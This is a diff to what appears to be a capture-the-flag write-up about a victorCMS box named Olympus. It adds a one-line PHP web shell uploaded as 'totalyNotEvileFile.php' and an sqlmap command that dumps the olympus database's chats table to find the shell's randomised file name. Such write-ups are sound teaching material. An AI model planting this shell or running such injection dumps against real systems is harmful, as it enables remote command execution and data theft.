@@ -115,3 +115,10 @@ Session completed.
 ![image](https://user-images.githubusercontent.com/90036439/223985036-95de1514-234a-4bfb-8717-edfccd387bd5.png)
 
 Let's put together what we know. The IT guy made sure that the files that are sent to the server via chat have a random name. We also know that all messages are stored in the database including the files we send.
+
+```bash
+root@ip-10-10-70-200:~# cat totalyNotEvileFile.php 
+<?php system($_GET["cmd"]); ?>
+root@ip-10-10-70-200:~# sqlmap -r victorCMS-search.request --dump -D olympus -T chats --fresh-queries 
+
+```
